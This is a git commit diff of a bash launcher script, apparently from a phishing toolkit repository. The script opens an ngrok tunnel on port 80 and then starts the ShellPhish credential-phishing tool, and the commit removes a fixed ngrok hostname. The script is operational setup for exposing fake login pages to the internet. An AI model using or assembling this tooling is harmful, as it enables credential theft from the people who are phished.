d5df53e43025358771487773ea85111d19bf6a86
ChillVibesMushroom <99580833+ChillVibesMushroom@users.noreply.github.com>
2023-01-03 07:28:21 -0700

    Update shellphish.sh

--- shellphish.sh
+++ shellphish.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 #Credit goes to chillvibes && the squad at FBISEC  for the creation of this script
-xterm -title "ngrok" -e " sudo ngrok http 80 --hostname=bloggers.ngrok.io --region=us" &
+xterm -title "ngrok" -e " sudo ngrok http 80" &
 
 xterm -hold -title "shellphish" -e "cd ShellPhish && sudo bash shellphish.sh" &
 
